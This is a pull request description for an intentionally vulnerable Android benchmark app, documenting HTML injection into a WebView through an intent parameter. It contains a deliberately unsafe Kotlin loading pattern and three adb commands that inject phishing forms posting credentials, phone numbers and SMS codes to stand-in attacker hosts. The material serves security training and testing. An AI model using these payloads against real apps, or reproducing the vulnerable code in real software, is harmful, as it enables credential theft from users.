# Add oxo-android-ben45: Form-based Data Exfiltration Through Intent Parameter

## Overview

This PR adds **oxo-android-ben45**, an advanced Android security benchmark that demonstrates **Form-based Data Exfiltration** vulnerabilities in Android WebView components. This benchmark showcases how HTML injection can be used to create malicious forms that collect and exfiltrate sensitive user data.

## Vulnerability Details

**Attack Vector**: Form-based Data Exfiltration with Social Engineering

The benchmark simulates a news reader application (News Reader Pro) where malicious HTML forms are injected through intent parameters. These forms are designed to collect sensitive information such as credentials, personal data, and authentication tokens under the guise of legitimate functionality.

### Key Characteristics
- Injection of HTML forms with external action URLs
- Social engineering to encourage data submission
- Hidden form fields to collect app/device metadata
- Real-time data collection through form events
- Credential harvesting and personal information theft

### Vulnerable Code Pattern
```kotlin
val articleHtml = intent.getStringExtra("content") ?: ""
val fullHtml = """
    <html>
    <body>
        <div class="content">
            $articleHtml  // VULNERABLE - Forms can exfiltrate data!
        </div>
    </body>
    </html>
"""
webView.loadDataWithBaseURL("https://newsreader.app", fullHtml, "text/html", "utf-8", null)
```

## Testing Examples

```bash
# Credential harvesting form
adb shell 'am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e title "Login Required" -e content "<h2>Please Login to Continue</h2><form action=\"http://attacker.com/steal\" method=\"POST\"><input type=\"text\" name=\"username\" placeholder=\"Email/Username\" required><br><br><input type=\"password\" name=\"password\" placeholder=\"Password\" required><br><br><input type=\"submit\" value=\"Login\"></form>"'

# Account verification with phone number collection
adb shell 'am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e title "Account Verification" -e content "<div style=\"background:#ff6b35;color:white;padding:20px;\"><h2>🔒 Account Security Alert</h2><p>Verify your account to prevent suspension:</p><form action=\"http://malicious-server.com/collect\" method=\"POST\"><input type=\"text\" name=\"username\" placeholder=\"Username\" required><input type=\"password\" name=\"password\" placeholder=\"Password\" required><input type=\"text\" name=\"phone\" placeholder=\"Phone Number\" required><button type=\"submit\">VERIFY ACCOUNT</button></form></div>"'

# Security update with hidden data collection
adb shell 'am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e title "Security Update" -e content "<h2>Security Update Required</h2><form action=\"http://evil-server.com/collect\" method=\"POST\"><input type=\"hidden\" name=\"app_package\" value=\"co.ostorlab.myapplication\"><input type=\"hidden\" name=\"device_info\" value=\"android-device\"><label>Phone:</label><input type=\"tel\" name=\"phone\" required><label>SMS Code:</label><input type=\"text\" name=\"sms_code\" required><input type=\"submit\" value=\"Verify & Update\"></form>"'
```

## Advanced Attack Scenarios

### Financial Data Harvesting
- Credit card information collection forms
- Payment processing simulation
- Banking credential theft

### Multi-step Social Engineering
- Progressive information disclosure
- Trust-building through legitimate-looking forms
- Combination with other attack vectors

### Real-time Data Monitoring
- JavaScript form event handlers
- Keystroke logging simulation
- Live data transmission

## Impact Assessment

- **Confidentiality**: Critical - Direct collection of sensitive user data, credentials, PII
- **Integrity**: High - Can manipulate user trust and app functionality
- **Availability**: Medium - Can redirect users away from legitimate services
- **Data Protection**: Critical - GDPR/privacy law violations through unauthorized data collection
- **Financial Impact**: High - Credit card fraud, identity theft potential
- **OWASP Mobile Top 10**: M2 - Insecure Data Storage, M4 - Insecure Authentication, M7 - Client Code Quality
- **CWE**: CWE-79 (Cross-site Scripting), CWE-352 (Cross-Site Request Forgery), CWE-200 (Information Exposure)
- **Difficulty**: Medium-Hard

## Files Added

- `mobile/android/oxo-android-ben45/` - Complete Android project  
- `mobile/android/oxo-android-ben45/README.md` - Detailed vulnerability documentation
- `mobile/android/oxo-android-ben45/apks/oxo-android-ben45.apk` - Pre-built APK for testing

## Security Learning Objectives

This benchmark helps security professionals and developers understand:

1. How HTML injection can facilitate sophisticated data exfiltration attacks
2. The role of social engineering in technical vulnerabilities
3. Form-based attack vectors and data collection techniques
4. The importance of Content Security Policy (CSP) and form action restrictions
5. Real-world scenarios involving credential theft and identity harvesting
6. How to identify and prevent form-based data exfiltration in mobile applications
7. The intersection of technical vulnerabilities and privacy/data protection concerns

This benchmark represents an advanced security challenge that demonstrates how basic HTML injection vulnerabilities can be weaponized for large-scale data collection and demonstrates the critical importance of comprehensive input validation and output encoding in mobile applications.
